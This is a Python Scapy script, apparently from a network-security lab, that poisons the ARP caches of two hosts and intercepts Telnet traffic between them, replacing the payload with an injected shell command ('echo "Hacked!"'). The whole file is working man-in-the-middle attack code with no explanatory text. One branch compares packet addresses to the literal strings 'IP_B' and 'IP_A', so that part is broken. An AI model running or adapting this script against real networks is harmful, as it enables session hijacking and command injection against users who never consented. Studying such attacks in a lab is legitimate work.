from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import *
import socket
import multiprocessing
import time


def get_ip_address(interface):
    ip_address = socket.gethostbyname(socket.gethostname())
    return ip_address


def arp_request(victim_MAC, victim_IP, faked_IP, attacker_MAC):
    ARP_packet = Ether(dst=victim_MAC, src=attacker_MAC) / ARP(hwsrc=attacker_MAC, psrc=faked_IP, hwdst=victim_MAC, pdst=victim_IP)
    #ARP_packet.show()
    sendp(ARP_packet)


def arp_reply(victim_MAC, faked_IP, attacker_MAC):
    ARP_packet = Ether(dst=victim_MAC) / ARP(op='is-at', psrc=faked_IP, hwsrc=attacker_MAC)
    #ARP_packet.show()
    sendp(ARP_packet, verbose=0)


def arp_poisoning(mac_A, ip_B, mac_M, mac_B, ip_A):
    while True:
        arp_reply(mac_A, ip_B, mac_M)
        arp_reply(mac_B, ip_A, mac_M)
        arp_request(mac_A, ip_A, ip_B, mac_M)
        arp_request(mac_B, ip_B, ip_A, mac_M)
        time.sleep(5)


def spoof_pkt(pkt, ip_A, ip_B, new_payload):

    if pkt[IP].src == ip_A and pkt[IP].dst == ip_B:
        # Create the new packet based on the captured one
        newpkt = IP(bytes(pkt[IP]))
        #By deleting the checksums, you're telling Scapy to calculate new ones based on the modified packet.
        del newpkt.chksum
        del newpkt[TCP].payload
        del newpkt[TCP].chksum

        if pkt[TCP].payload:
            data = pkt[TCP].payload.load  # The original payload
            original_text = data.decode('utf-8')
            print("Original telnet text: ", original_text)
            # Change the payload
            print("Changed telnet text: ", new_payload)
            newdata = bytes(new_payload, 'utf-8')
            send(newpkt / newdata)

        else:
            send(newpkt)

    # If it is a reply packet from B to A, don't change anything
    elif pkt[IP].src == 'IP_B' and pkt[IP].dst == 'IP_A':
        # Create the new packet based on the captured one
        # Do not change anything
        newpkt = IP(bytes(pkt[IP]))
        del newpkt.chksum
        del newpkt[TCP].chksum
        send(newpkt)


if __name__ == '__main__':
    mac_A = '02:42:0a:09:00:05'
    mac_B = '02:42:0a:09:00:06'
    mac_M = '02:42:0a:09:00:69'
    ip_A = '10.9.0.5'
    ip_B = '10.9.0.6'
    ip_M = '10.9.0.105'
    new_payload = 'echo "Hacked!"'
    # Get the IP address of the interface
    attacker_ip_address = get_ip_address('eth0')

    # Start the arp_poisoning function as a separate process
    p = multiprocessing.Process(target=arp_poisoning, args=(mac_A, ip_B, mac_M, mac_B, ip_A))
    p.start()

    # Define the filter to capture only the packets that are not sourced or destined to the attacker
    mac_to_exclude = mac_M
    filter = f'tcp and dst port 23 and not ether src {mac_to_exclude}'
    # Start the sniffer and call the spoof_pkt function for each packet captured
    pkt = sniff(iface='eth0', filter=filter, prn=lambda pkt: spoof_pkt(pkt, ip_A, ip_B, new_payload))

    p.terminate()
